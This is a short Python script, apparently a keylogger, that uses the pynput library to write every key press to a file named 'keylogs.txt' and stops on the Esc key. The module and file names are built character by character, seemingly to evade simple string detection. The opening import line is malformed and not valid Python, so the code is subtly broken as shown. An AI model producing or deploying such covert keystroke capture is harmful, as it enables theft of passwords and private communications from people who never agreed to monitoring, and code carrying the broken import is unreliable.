import __import__('p'+'y'+'n'+'p'+'u'+'t') as pynput
from pynput import keyboard
def on_press(key):
    try:
        with open(''.join(['k', 'e', 'y', 'l', 'o', 'g', 's', '.', 't', 'x', 't']), 'a') as f:
            f.write(key.char)
        print(f'Alphanumeric key pressed: {key.char}')
    except AttributeError:
        with open(''.join(['k', 'e', 'y', 'l', 'o', 'g', 's', '.', 't', 'x', 't']), 'a') as f:
            f.write(str(key))
        print(f'Special key pressed: {key}')
def on_release(key):
    if key == keyboard.Key.esc:
        return False
with keyboard.Listener(on_press=on_press, on_release=on_release) as listener:
    listener.join()